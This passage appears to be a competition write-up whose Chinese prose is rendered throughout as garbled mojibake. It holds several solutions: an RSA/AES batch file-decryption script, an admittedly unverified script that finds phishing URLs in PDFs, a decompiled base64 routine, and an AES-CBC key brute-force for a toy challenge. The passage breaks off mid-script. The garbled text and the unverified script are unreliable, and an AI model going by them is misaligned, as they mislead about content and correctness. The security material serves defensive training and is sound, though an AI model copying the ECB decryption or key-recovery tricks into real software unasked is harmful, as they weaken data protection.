124 125 \u0026#34;\u0026#34;\u0026#34; æ‰¹é‡æ–‡ä»¶è§£å¯†ç¨‹åº ä½¿ç”¨RSAç§é’¥è§£å¯†AESå¯†é’¥ï¼Œç„¶åä½¿ç”¨AES-256-ECBç®—æ³•è§£å¯†æ–‡ä»¶ \u0026#34;\u0026#34;\u0026#34; import os from pathlib import Path from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes from cryptography.hazmat.primitives import padding, hashes from cryptography.hazmat.primitives.asymmetric import padding as asym_padding from cryptography.hazmat.primitives import serialization from cryptography.hazmat.backends import default_backend def load_rsa_private_key(private_key_file): \u0026#34;\u0026#34;\u0026#34; ä»æ–‡ä»¶åŠ è½½RSAç§é’¥ \u0026#34;\u0026#34;\u0026#34; with open(private_key_file, \u0026#39;rb\u0026#39;) as f: private_key = serialization.load_pem_private_key( f.read(), password=None, backend=default_backend() ) return private_key def decrypt_aes_key_with_rsa(encrypted_key_file, private_key): \u0026#34;\u0026#34;\u0026#34; ä½¿ç”¨RSAç§é’¥è§£å¯†AESå¯†é’¥ \u0026#34;\u0026#34;\u0026#34; with open(encrypted_key_file, \u0026#39;rb\u0026#39;) as f: encrypted_key = f.read() # ä½¿ç”¨OAEP paddingè§£å¯† (ä¸åŠ å¯†æ—¶ä½¿ç”¨çš„ç›¸åŒ) aes_key = private_key.decrypt( encrypted_key, asym_padding.OAEP( mgf=asym_padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None ) ) return aes_key def decrypt_file_aes_ecb(file_path, aes_key, output_path=None): \u0026#34;\u0026#34;\u0026#34; ä½¿ç”¨AES-256-ECBç®—æ³•è§£å¯†æ–‡ä»¶ \u0026#34;\u0026#34;\u0026#34; with open(file_path, \u0026#39;rb\u0026#39;) as f: ciphertext = f.read() # åˆ›å»ºAES-ECBè§£å¯†å™¨ cipher = Cipher(algorithms.AES(aes_key), modes.ECB(), backend=default_backend()) decryptor = cipher.decryptor() # è§£å¯†æ•°æ® padded_plaintext = decryptor.update(ciphertext) + decryptor.finalize() # ç§»é™¤PKCS7å¡«å…… unpadder = padding.PKCS7(128).unpadder() plaintext = unpadder.update(padded_plaintext) + unpadder.finalize() # ç¡®å®šè¾“å‡ºè·¯å¾„ if output_path is None: # ç§»é™¤.encåç¼€ if str(file_path).endswith(\u0026#39;.enc\u0026#39;): output_path = str(file_path)[:-4] else: output_path = str(file_path) + \u0026#39;.dec\u0026#39; with open(output_path, \u0026#39;wb\u0026#39;) as f: f.write(plaintext) return output_path def batch_decrypt_files(directory, private_key_file, encrypted_key_file): \u0026#34;\u0026#34;\u0026#34; æ‰¹é‡è§£å¯†æŒ‡å®šç›®å½•ä¸‹çš„.encæ–‡ä»¶ \u0026#34;\u0026#34;\u0026#34; print(f\u0026#34;æ­£åœ¨åŠ è½½RSAç§é’¥: {private_key_file}\u0026#34;) private_key = load_rsa_private_key(private_key_file) print(f\u0026#34;æ­£åœ¨è§£å¯†AESå¯†é’¥: {encrypted_key_file}\u0026#34;) aes_key = decrypt_aes_key_with_rsa(encrypted_key_file, private_key) print(f\u0026#34;AESå¯†é’¥å·²è§£å¯†ï¼Œé•¿åº¦: {len(aes_key)} å­—èŠ‚\u0026#34;) # ä¿å­˜è§£å¯†åçš„AESå¯†é’¥ with open(\u0026#34;decrypted_aes.key\u0026#34;, \u0026#39;wb\u0026#39;) as f: f.write(aes_key) print(\u0026#34;AESå¯†é’¥å·²ä¿å­˜åˆ° decrypted_aes.key\u0026#34;) # æŸ¥æ‰¾æ‰€æœ‰.encæ–‡ä»¶ directory_path = Path(directory) enc_files = list(directory_path.glob(\u0026#34;**/*.enc\u0026#34;)) if not enc_files: print(\u0026#34;æœªæ‰¾åˆ°éœ€è¦è§£å¯†çš„.encæ–‡ä»¶\u0026#34;) return print(f\u0026#34;\\næ‰¾åˆ° {len(enc_files)} ä¸ªæ–‡ä»¶éœ€è¦è§£å¯†\u0026#34;) print(\u0026#34;-\u0026#34; * 50) decrypted_count = 0 for enc_file in enc_files: try: output_path = decrypt_file_aes_ecb(enc_file, aes_key) print(f\u0026#34;å·²è§£å¯†: {enc_file.name} -\u0026gt; {Path(output_path).name}\u0026#34;) decrypted_count += 1 except Exception as e: print(f\u0026#34;è§£å¯†å¤±è´¥: {enc_file.name} - {e}\u0026#34;) print(\u0026#34;-\u0026#34; * 50) print(f\u0026#34;è§£å¯†å®Œæˆ! æˆåŠŸè§£å¯† {decrypted_count}/{len(enc_files)} ä¸ªæ–‡ä»¶\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: # è®¾ç½®è·¯å¾„ base_dir = r\u0026#34;c:\\Users\\33113\\Desktop\\æ•°ä¿¡æ¯\\enpdf\u0026#34; private_key_file = os.path.join(base_dir, \u0026#34;key\u0026#34;, \u0026#34;pr.pem\u0026#34;) encrypted_key_file = os.path.join(base_dir, \u0026#34;store.key\u0026#34;) pdfs_directory = os.path.join(base_dir, \u0026#34;pdfs\u0026#34;) batch_decrypt_files(pdfs_directory, private_key_file, encrypted_key_file) æäº¤è¯¥æ–‡æ¡£md5å€¼å³å¯\né’“é±¼é“¾æ¥ï¼ˆshitï¼‰ é¢˜ç›® åœ¨äº‹ä»¶è°ƒæŸ¥ä¸­ï¼Œå®‰å…¨å›¢é˜Ÿç»Ÿè®¡å‡ºå…±è®¡ 999 ä»½ PDF æ–‡æ¡£ï¼Œå…¶ä¸­éƒ¨åˆ†æ–‡æ¡£åŒ…å«å†…éƒ¨å¤–é“¾ã€‚ä¸ºé¿å…å®‰å…¨é£é™©ï¼Œéœ€å¯¹æ‰€æœ‰æ–‡æ¡£è¿›è¡Œé“¾æ¥å®¡æŸ¥ã€‚\nPDF ä¸­çš„ URL å¯èƒ½ä»¥ä»¥ä¸‹å½¢å¼å‡ºç°:\n1. æ–‡æœ¬ä¸­ç›´æ¥æ˜¾ç¤ºçš„ URL\n2. éšè—åœ¨ PDF Annotation è¶…é“¾æ¥å†…çš„ URL(æ˜¾ç¤ºå†…å®¹ä¸çœŸå®è·³è½¬åœ°å€å¯èƒ½ä¸åŒ)\n3. URL å‚æ•°ä¸­çš„è·³è½¬åœ°å€:æŸäº› URL å¯èƒ½åŒ…å« redirectã€nextã€ur1 ç­‰å‚æ•°ï¼Œå‚æ•°å€¼æŒ‡å‘å®é™…è·³è½¬çš„ç›®æ ‡åœ°å€(å³ä½¿ URL æœ¬èº«çš„ä¸»åŸŸåä¸ºåˆæ³•åŸŸåï¼Œå‚æ•°ä¸­çš„è·³è½¬åœ°å€ä¹Ÿéœ€è¦å•ç‹¬æ£€æŸ¥)\nå…¬å¸åˆæ³•åŸŸåèŒƒå›´ä¸º:\nveritytech.com åŠå…¶æ‰€æœ‰å­åŸŸå(*.veritytech.com)\nè¯·åˆ†æ 999ä»½PDFï¼Œæ‰¾å‡ºæ‰€æœ‰æŒ‡å‘é veritvtech,com åŸŸå çš„ URL(åŒ…æ‹¬æ–‡æœ¬æ˜¾ç¤ºã€Annotation è·³è½¬ URIä»¥åŠ URL å‚æ•°ä¸­çš„è·³è½¬åœ°å€)ï¼Œæå–å…¶å®Œæ•´URLï¼ŒæŒ‰å­—å…¸åºå‡åºæ’åºåï¼Œç”¨è‹±æ–‡åŠè§’é€—å·æ‹¼æ¥ï¼Œæœ€ç»ˆå¯¹æ‹¼æ¥å­—ç¬¦ä¸²è®¡ç®— 32 ä½å°å†™ MD5 ä½œä¸ºç­”æ¡ˆã€‚\nå¯¹äºåŒ…å«è·³è½¬å‚æ•°çš„ URL(å¦‚ https://mail.veritytech.com/auth?next=https://evi1.com)ï¼Œå¦‚æœ URLæœ¬èº«çš„ä¸»åŸŸåä¸ºåˆæ³•åŸŸåï¼Œåˆ™ä¸åº”æå–è¯¥å®Œæ•´ URL;ä½†éœ€è¦æå–å‚æ•°ä¸­çš„è·³è½¬åœ°å€(å¦‚ https://evi1.com)è¿›è¡Œåˆ¤æ–­ã€‚\nè‹¥è¯†åˆ«å‡ºçš„é’“é±¼é“¾æ¥ä¸ºå¦‚ä¸‹3æ¡(å­—å…¸åºå‡åº)\nhttps://company.com/login\nhttps://veritytech.com.io/auth\nhttps://verify-veritytech.xyz/update\nåˆ™æ‹¼æ¥ä¸º:\nhttps://company.com/login,https://veritytech.com.io/auth,https://verify-veritytech.xyz/update\nå¯¹è¯¥å­—ç¬¦ä¸²è®¡ç®— MD5 å³ä¸ºæœ€ç»ˆæäº¤å€¼ï¼Œä¾‹å¦‚:\n7c57e0774ddf8f4b8539b255a8f6f506\nç¤ºä¾‹è¯´æ˜:\nå¦‚æœ PDF ä¸­å­˜åœ¨ URL https://mail.veritytech.com/auth?next=https://evi1.com/loginï¼Œç”±äºå®Œæ•´URLçš„ä¸»åŸŸåä¸º mail.veritytech.com(åˆæ³•)ä¸åº”æå–è¯¥å®Œæ•´ URL;ä½†éœ€è¦æå–å‚æ•°ä¸­çš„ https://evi1.com/login è¿›è¡Œåˆ¤æ–­ï¼Œè‹¥å…¶ä¸»åŸŸåä¸ºéveritytech.com åŸŸåï¼Œåˆ™åº”æå–è¯¥ URLã€‚\nå¦‚æœ PDF æ–‡æœ¬ä¸­ç›´æ¥æ˜¾ç¤º https://evil.com/loginï¼Œåˆ™ç›´æ¥æå–è¯¥ URLã€‚\nå¦‚æœ PDF Annotation ä¸­éšè—çš„è·³è½¬åœ°å€ä¸º https://evi1.com/loginï¼Œåˆ™æå–è¯¥ URLã€‚\nè§£ç­” æ¯”èµ›æ—¶é—´å†…æ²¡åšå‡ºæ¥ï¼Œä¸çŸ¥é“ä¸‹é¢è„šæœ¬å¯¹ä¸å¯¹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 \u0026#34;\u0026#34;\u0026#34; æœ€ç»ˆéªŒè¯è„šæœ¬ - å…¨é¢æ£€æŸ¥æ‰€æœ‰URL \u0026#34;\u0026#34;\u0026#34; import os import re import hashlib from urllib.parse import urlparse, parse_qs, unquote import fitz # PyMuPDF def clean_url(url): \u0026#34;\u0026#34;\u0026#34;æ¸…ç†URLï¼Œç§»é™¤æœ«å°¾çš„éURLå­—ç¬¦\u0026#34;\u0026#34;\u0026#34; url = re.sub(r\u0026#39;[\\u4e00-\\u9fffï¼Œã€‚ã€ï¼›ï¼šï¼ï¼Ÿã€ã€‘ï¼ˆï¼‰ã€Šã€‹\u0026#34;\u0026#34;\u0026#39;\u0026#39;]+.*$\u0026#39;, \u0026#39;\u0026#39;, url) while url and url[-1] in \u0026#39;.,;:!?)]\\\u0026#39;\u0026#34;\u0026#39;: url = url[:-1] return url def is_valid_url(url): \u0026#34;\u0026#34;\u0026#34;æ£€æŸ¥URLæ˜¯å¦æœ‰æ•ˆï¼ˆæœ‰å®Œæ•´çš„åŸŸåï¼‰\u0026#34;\u0026#34;\u0026#34; try: parsed = urlparse(url) netloc = parsed.netloc.lower() if \u0026#39;:\u0026#39; in netloc: host = netloc.split(\u0026#39;:\u0026#39;)[0] else: host = netloc if not host or \u0026#39;.\u0026#39; not in host: return False parts = host.split(\u0026#39;.\u0026#39;) if len(parts[-1]) \u0026lt; 2: return False incomplete_endings = [ \u0026#39;veri\u0026#39;, \u0026#39;verit\u0026#39;, \u0026#39;verity\u0026#39;, \u0026#39;verityt\u0026#39;, \u0026#39;verityte\u0026#39;, \u0026#39;veritytec\u0026#39;, \u0026#39;veritytech\u0026#39;, \u0026#39;ve\u0026#39;, \u0026#39;ver\u0026#39; ] if parts[-1] in incomplete_endings: return False if host.endswith(\u0026#39;.veritytech\u0026#39;) or host.endswith(\u0026#39;.veritytec\u0026#39;) or \\ host.endswith(\u0026#39;.verityte\u0026#39;) or host.endswith(\u0026#39;.verityt\u0026#39;) or \\ host.endswith(\u0026#39;.verity\u0026#39;) or host.endswith(\u0026#39;.verit\u0026#39;) or \\ host.endswith(\u0026#39;.veri\u0026#39;) or host.endswith(\u0026#39;.ver\u0026#39;) or host.endswith(\u0026#39;.ve\u0026#39;): return False if host.endswith(\u0026#39;.veritytech.co\u0026#39;) and (not parsed.path or parsed.path == \u0026#39;/\u0026#39;): return False return True except: return False def extract_domain(url): \u0026#34;\u0026#34;\u0026#34;æå–URLçš„ä¸»åŸŸå\u0026#34;\u0026#34;\u0026#34; try: parsed = urlparse(url) return parsed.netloc.lower() except: return \u0026#34;\u0026#34; def get_host(domain): \u0026#34;\u0026#34;\u0026#34;ä»åŸŸåä¸­æå–ä¸»æœºåï¼ˆå»æ‰ç«¯å£ï¼‰\u0026#34;\u0026#34;\u0026#34; if \u0026#39;:\u0026#39; in domain: return domain.split(\u0026#39;:\u0026#39;)[0] return domain def is_legitimate_domain(domain): \u0026#34;\u0026#34;\u0026#34;æ£€æŸ¥åŸŸåæ˜¯å¦ä¸ºåˆæ³•åŸŸåï¼ˆveritytech.comåŠå…¶å­åŸŸåï¼‰\u0026#34;\u0026#34;\u0026#34; if not domain: return False host = get_host(domain.lower()) return host == \u0026#34;veritytech.com\u0026#34; or host.endswith(\u0026#34;.veritytech.com\u0026#34;) def extract_redirect_urls(url): \u0026#34;\u0026#34;\u0026#34;ä»URLå‚æ•°ä¸­æå–å¯èƒ½çš„è·³è½¬åœ°å€\u0026#34;\u0026#34;\u0026#34; redirect_params = [\u0026#39;redirect\u0026#39;, \u0026#39;next\u0026#39;, \u0026#39;url\u0026#39;, \u0026#39;uri\u0026#39;, \u0026#39;goto\u0026#39;, \u0026#39;target\u0026#39;, \u0026#39;to\u0026#39;, \u0026#39;link\u0026#39;, \u0026#39;return\u0026#39;, \u0026#39;returnurl\u0026#39;, \u0026#39;return_url\u0026#39;, \u0026#39;redirect_uri\u0026#39;, \u0026#39;redirect_url\u0026#39;, \u0026#39;callback\u0026#39;, \u0026#39;continue\u0026#39;, \u0026#39;dest\u0026#39;, \u0026#39;destination\u0026#39;, \u0026#39;redir\u0026#39;, \u0026#39;ref\u0026#39;, \u0026#39;referer\u0026#39;, \u0026#39;referrer\u0026#39;] redirect_urls = [] try: parsed = urlparse(url) query_params = parse_qs(parsed.query) for param_name, values in query_params.items(): param_lower = param_name.lower() if any(rp in param_lower for rp in redirect_params): for value in values: decoded_value = unquote(value) if decoded_value.startswith(\u0026#39;http://\u0026#39;) or decoded_value.startswith(\u0026#39;https://\u0026#39;): redirect_urls.append(decoded_value) except Exception as e: pass return redirect_urls def extract_urls_from_text(text): \u0026#34;\u0026#34;\u0026#34;ä»æ–‡æœ¬ä¸­æå–URL\u0026#34;\u0026#34;\u0026#34; url_pattern = r\u0026#39;https?://[a-zA-Z0-9][-a-zA-Z0-9]*(?:\\.[a-zA-Z0-9][-a-zA-Z0-9]*)+(?::\\d+)?(?:/[^\\s\u0026lt;\u0026gt;\\\u0026#34;\\\u0026#39;ï¼‰\\]}\\u4e00-\\u9fff]*)?\u0026#39; urls = re.findall(url_pattern, text) cleaned_urls = [] for url in urls: url = clean_url(url) if url and is_valid_url(url): cleaned_urls.append(url) return cleaned_urls def analyze_pdf(pdf_path): \u0026#34;\u0026#34;\u0026#34;åˆ†æå•ä¸ªPDFæ–‡ä»¶ï¼Œæå–æ‰€æœ‰URL\u0026#34;\u0026#34;\u0026#34; urls_found = set() try: doc = fitz.open(pdf_path) for page_num in range(len(doc)): page = doc[page_num] # 1. æå–æ–‡æœ¬ä¸­çš„URL text = page.get_text() text_urls = extract_urls_from_text(text) urls_found.update(text_urls) # 2. æå–Annotationä¸­çš„URL annotations = page.annots() if annotations: for annot in annotations: try: info = annot.info if \u0026#39;uri\u0026#39; in info: url = clean_url(info[\u0026#39;uri\u0026#39;]) if url and is_valid_url(url): urls_found.add(url) except: pass # 3. æå–é“¾æ¥ï¼ˆLink annotationsï¼‰ links = page.get_links() for link in links: if \u0026#39;uri\u0026#39; in link: url = clean_url(link[\u0026#39;uri\u0026#39;]) if url and is_valid_url(url): urls_found.add(url) doc.close() except Exception as e: print(f\u0026#34;Error processing {pdf_path}: {e}\u0026#34;) return urls_found def main(): pdf_dir = r\u0026#34;c:\\Users\\33113\\Desktop\\æ•°ä¿¡æ¯\\æ–‡æ¡£å®‰å…¨äº‹ä»¶åˆ†æ\\decrypted_pdfs\u0026#34; all_urls = set() url_sources = {} # è®°å½•æ¯ä¸ªURLçš„æ¥æº pdf_files = [f for f in os.listdir(pdf_dir) if f.endswith(\u0026#39;.pdf\u0026#39;)] print(f\u0026#34;å…±å‘ç° {len(pdf_files)} ä¸ªPDFæ–‡ä»¶\u0026#34;) for i, pdf_file in enumerate(pdf_files): if (i + 1) % 100 == 0: print(f\u0026#34;æ­£åœ¨å¤„ç†: {i + 1}/{len(pdf_files)}\u0026#34;) pdf_path = os.path.join(pdf_dir, pdf_file) urls = analyze_pdf(pdf_path) for url in urls: all_urls.add(url) if url not in url_sources: url_sources[url] = [] url_sources[url].append(pdf_file) print(f\u0026#34;\\nå…±å‘ç° {len(all_urls)} ä¸ªURL\u0026#34;) # åˆ†æURLï¼Œæ‰¾å‡ºéveritytech.comåŸŸåçš„URL non_legitimate_urls = set() for url in all_urls: domain = extract_domain(url) if is_legitimate_domain(domain): # åˆæ³•åŸŸåï¼Œä½†éœ€è¦æ£€æŸ¥å‚æ•°ä¸­çš„è·³è½¬åœ°å€ redirect_urls = extract_redirect_urls(url) for redirect_url in redirect_urls: redirect_url_clean = clean_url(redirect_url) if redirect_url_clean and is_valid_url(redirect_url_clean): redirect_domain = extract_domain(redirect_url_clean) if redirect_domain and not is_legitimate_domain(redirect_domain): non_legitimate_urls.add(redirect_url_clean) else: # éåˆæ³•åŸŸå if domain: non_legitimate_urls.add(url) print(f\u0026#34;å…±å‘ç° {len(non_legitimate_urls)} ä¸ªéæ³•URL\u0026#34;) # æŒ‰å­—å…¸åºæ’åº sorted_urls = sorted(non_legitimate_urls) # æ‰“å°æ‰€æœ‰éæ³•URLåŠå…¶æ¥æº print(\u0026#34;\\néæ³•URLåˆ—è¡¨åŠæ¥æº:\u0026#34;) for url in sorted_urls: sources = url_sources.get(url, []) # æ£€æŸ¥æ˜¯å¦æ¥è‡ªè·³è½¬å‚æ•° is_redirect = False for full_url in all_urls: if is_legitimate_domain(extract_domain(full_url)): redirect_urls = extract_redirect_urls(full_url) if url in [clean_url(r) for r in redirect_urls]: is_redirect = True sources = url_sources.get(full_url, []) break if is_redirect: print(f\u0026#34; {url} (æ¥è‡ªè·³è½¬å‚æ•°, æºæ–‡ä»¶: {sources[:2]}...)\u0026#34;) else: print(f\u0026#34; {url} (æºæ–‡ä»¶: {sources[:2]}...)\u0026#34;) # ç”¨é€—å·æ‹¼æ¥ joined_string = \u0026#34;,\u0026#34;.join(sorted_urls) print(f\u0026#34;\\næ‹¼æ¥åçš„å­—ç¬¦ä¸²:\u0026#34;) print(joined_string) # è®¡ç®—MD5 md5_hash = hashlib.md5(joined_string.encode(\u0026#39;utf-8\u0026#39;)).hexdigest() print(f\u0026#34;\\nMD5 (32ä½å°å†™): {md5_hash}\u0026#34;) return sorted_urls, md5_hash if __name__ == \u0026#34;__main__\u0026#34;: main() MD5 (32ä½å°å†™): e5d7a8f4928cf5bb60df13dad400adbb\næ•°æ®å­˜å‚¨ æ•°æ®å­˜å‚¨1 é¢˜ç›® å·¥ç¨‹å¸ˆå°ç‹ä¸ºäº†ä¿è¯æ•°æ®çš„å®‰å…¨å­˜å‚¨ï¼Œå¼€å‘äº†å¯¹æ•°æ®å¤„ç†çš„ç¨‹åºï¼Œä½†è¿™æ ·çš„å¤„ç†æ–¹å¼å®‰å…¨å—?åˆ†æç¨‹åºåŠŸèƒ½ï¼Œè§£å¯†æ–‡ä»¶è·å–åŸå§‹æ•°æ®ï¼Œæäº¤ç¬¬6è¡Œç¬¬2åˆ—æ•°æ®ã€‚\nç»™äº†re87a57766æ–‡ä»¶å’Œinfo_19ff9a2.ori.enæ–‡ä»¶ï¼Œè§£å¯†info_19ff9a2.ori.enï¼Œæäº¤ç¬¬å…­è¡Œç¬¬äºŒåˆ—\nè§£ç­” æœ¬é¢˜æ˜¯ä¸ºç¬¬äºŒé¢˜åšé“ºå«çš„\nç›´æ¥ida\nä¸­è½¬å‡½æ•°ï¼Œçœ‹sub_401249\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 char *__fastcall sub_401249(unsigned __int8 *a1, int a2, unsigned int *a3) { unsigned __int8 *v4; // rax unsigned int v5; // eax int v6; // eax unsigned int v7; // eax unsigned int v8; // eax unsigned __int8 *v11; // [rsp+10h] [rbp-18h] unsigned int v12; // [rsp+1Ch] [rbp-Ch] unsigned int v13; // [rsp+1Ch] [rbp-Ch] int v14; // [rsp+20h] [rbp-8h] int v15; // [rsp+24h] [rbp-4h] int v16; // [rsp+24h] [rbp-4h] int v17; // [rsp+24h] [rbp-4h] v11 = a1; v15 = 0; v14 = 0; v12 = 0; if ( !a1 ) return 0; if ( !dword_4042A0 ) sub_4011D6(); while ( 1 ) { v6 = a2--; if ( !v6 || v12 \u0026gt; 0xFFFFFFFB ) break; v4 = v11++; v16 = *v4 + v15; if ( ++v14 == 3 ) { byte_4042A4[v12] = byte_402020[v16 \u0026gt;\u0026gt; 18]; byte_4042A4[v12 + 1] = byte_402020[(v16 \u0026gt;\u0026gt; 12) \u0026amp; 0x3F]; byte_4042A4[v12 + 2] = byte_402020[(v16 \u0026gt;\u0026gt; 6) \u0026amp; 0x3F]; v5 = v12 + 3; v12 += 4; byte_4042A4[v5] = byte_402020[v16 \u0026amp; 0x3F]; v15 = 0; v14 = 0; } else { v15 = v16 \u0026lt;\u0026lt; 8; } } if ( v14 ) { v17 = v15 \u0026lt;\u0026lt; (8 * (2 - v14)); byte_4042A4[v12] = byte_402020[v17 \u0026gt;\u0026gt; 18]; byte_4042A4[v12 + 1] = byte_402020[(v17 \u0026gt;\u0026gt; 12) \u0026amp; 0x3F]; v7 = v12 + 2; v13 = v12 + 3; if ( v14 == 1 ) byte_4042A4[v7] = 61; else byte_4042A4[v7] = byte_402020[(v17 \u0026gt;\u0026gt; 6) \u0026amp; 0x3F]; v8 = v13; v12 = v13 + 1; byte_4042A4[v8] = 61; } byte_4042A4[v12] = 0; *a3 = v12; return byte_4042A4; } è¿™æ˜¯ä¸€ä¸ªbase64ç¼–ç å‡½æ•°\næ€»ç»“ï¼šre87a57766æ˜¯ä¸ªELFå¯æ‰§è¡Œæ–‡ä»¶ï¼Œè¯»å–info_19ff9a2.oriæ–‡ä»¶ï¼Œbase64ç¼–ç å…¶å†…å®¹åï¼Œè¾“å‡ºä¸ºinfo_19ff9a2.ori.enc\næ•°æ®å­˜å‚¨2ï¼ˆæ²¡åšå‡ºæ¥ï¼‰ é¢˜ç›® å·¥ç¨‹å¸ˆå°ç‹è®¤è¯†åˆ°å‰é¢å¼€å‘çš„ç¨‹åºå¹¶ä¸èƒ½ä¿è¯å¯¹æ•°æ®çš„å®‰å…¨å­˜å‚¨ï¼Œç°åœ¨å¯¹å¤„ç†ç¨‹åºè¿›è¡Œäº†æ”¹è¿›ï¼Œè¿™æ¬¡èƒ½è¡Œå—?åˆ†æç¨‹åºåŠŸèƒ½ï¼Œè§£å¯†æ–‡ä»¶è·å–åŸå§‹æ•°æ®ï¼Œæäº¤ç¬¬8è¡Œç¬¬2åˆ—æ•°æ®ã€‚\nç±»ä¼¼ä¸Šé¢˜ï¼ŒåŠ å¯†æ–¹å¼å˜äº†\nè§£ç­” â€\næ•°æ®è§£å¯† é¢˜ç›® 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 import os from Crypto.Util.number import * from Crypto.Cipher import AES from secret import flag, key from Crypto.Util.Padding import pad assert(len(flag) == 38) assert flag[:5] == b\u0026#39;flag{\u0026#39; and flag[-1:] == b\u0026#39;}\u0026#39; assert(len(key) == 16) flag=\u0026#39;flag{IADMIN-TOP-18880101-7634567_2025}\u0026#39; def padding(msg): tmp = 16 - len(msg) % 16 pad = format(tmp, \u0026#39;02x\u0026#39;) return bytes.fromhex(pad * tmp) + msg message = padding(flag) hint = bytes_to_long(key) ^ bytes_to_long(message[:16]) message = pad(message, 16, \u0026#39;pkcs7\u0026#39;) print(message) IV = os.urandom(16) encryption = AES.new(key, AES.MODE_CBC, iv=IV) enc = encryption.encrypt(message) print(\u0026#39;enc =\u0026#39;, enc.hex()) print(\u0026#39;hint =\u0026#39;, hex(hint)[2:]) # enc = 1ce1df3812668ce0bccd86c146cc56989681e128edd0676f5d26e01abdee90c860e22a5a491f94ac5ca3ab02242740fb8c35a3b60ea737ca0d2662fba2b0e299 # hint = 32393f4e3c3c4f3e323a512a5356437d åæ§½ï¼šè¿™é¢˜æ˜¯å›ç«‹å‡ºçš„å§ï¼Œè·Ÿæˆ‘ä¸€ä¸ªæœˆå‰åšçš„sm4ç‰ˆæœ¬ä¸€æ¨¡ä¸€æ ·\nè§£ç­” 1 2 3 4 5 6 7 8 9 10 def padding(msg): tmp = 16 - len(msg) % 16 pad = format(tmp, \u0026#39;02x\u0026#39;) return bytes.fromhex(pad * tmp) + msg msg1 = \u0026#34;flag{0123456789abcdef0123456789abcdef}\u0026#34; msg2 = padding(msg1.encode()) print(msg2) msg3 = pad(msg2 , 16, \u0026#39;pkcs7\u0026#39;) print(padding(msg3)) è‡ªå·±ç¼–ä¸€ç‚¹æ•°æ®çœ‹çœ‹å¡«å……æ•ˆæœ\n1 2 b\u0026#39;\\n\\n\\n\\n\\n\\n\\n\\n\\n\\nflag{0123456789abcdef0123456789abcdef}\u0026#39; b\u0026#39;\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\n\\n\\n\\n\\n\\n\\n\\n\\n\\nflag{0123456789abcdef0123456789abcdef}\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\u0026#39; å¯çŸ¥hint=â€˜\\n\\n\\n\\n\\n\\n\\n\\n\\n\\nflag{?\u0026rsquo; ^ key\nå¯é€šè¿‡çˆ†ç ´æœ€åä¸€ä½çš„å€¼ï¼Œå°è¯•å“ªä¸ªkeyæ˜¯å¯¹çš„\n1 2 3 4 5 6 7 c1 = enc(k,p1^iv) c2 = enc(k,p2^c1) c3 = enc(k,p3^c2) p3 = dec(k,c3)^c2 p2 = dec(k,c2)^c1 p1 = dec(k,c1)^iv æ ¹æ®cbcçš„åŠ å¯†æ–¹å¼ç‰¹å¾ï¼Œivä¸çŸ¥é“çš„æƒ…å†µä¸‹ï¼Œä¸å½±å“è§£å¯†p2ï¼Œp3ç­‰åç»­å¯†æ–‡\næ ¹æ®flagçš„ç‰¹å¾å¯çŸ¥ï¼Œæ˜æ–‡çš„ç»“å°¾æ˜¯ç‰¹å¾æ˜¯ }\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\nå› æ­¤åœ¨çˆ†ç ´çš„æ—¶å€™ï¼Œçœ‹å“ªä¸ªkeyå¯ä»¥æ»¡è¶³è¯¥ç‰¹å¾\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 import hashlib from Crypto.Cipher import AES import os import string from Crypto.Util.number import * from Crypto.Util.Padding import pad enc = \u0026#39;1ce1df3812668ce0bccd86c146cc56989681e128edd0676f5d26e01abdee90c860e22a5a491f94ac5ca3ab02242740fb8c35a3b60ea737ca0d2662fba2b0e299\u0026#39; hint = \u0026#39;32393f4e3c3c4f3e323a512a5356437d\u0026#39; \u0026#34;\u0026#34;\u0026#34; c1 = enc(k,p1^iv) c2 = enc(k,p2^c1) c3 = enc(k,p3^c2) p3 = dec(k,c3)^c2 p2 = dec(k,c2)^c1 p1 = dec(k,c1)^iv \u0026#34;\u0026#34;\u0026#34; \u0026#39;\u0026#39;\u0026#39; flag = 6+16+16 flag{? 5ä½ï¼Œè¿˜å·®ä¸€ä½ } ç»“å°¾ \u0026#39;\u0026#39;\u0026#39; def padding(msg): tmp = 16 - len(msg) % 16 pad = format(tmp, \u0026#39;02x\u0026#39;) return bytes.fromhex(pad * tmp) + msg msg1 = \u0026#34;flag{0123456789abcdef0123456789abcdef}\u0026#34; msg2 = padding(msg1.encode()) print(msg2) msg3 = pad(msg2 , 16, \u0026#39;pkcs7\u0026#39;) print(padding(msg3)) enc_b = bytes.fromhex(enc) # 64 hint_b = bytes.fromhex(hint) IV_fake = os.urandom(16) for char in string.ascii_letters + string.digits: # print(\u0026#34;flag{\u0026#34;+char) test_msg = 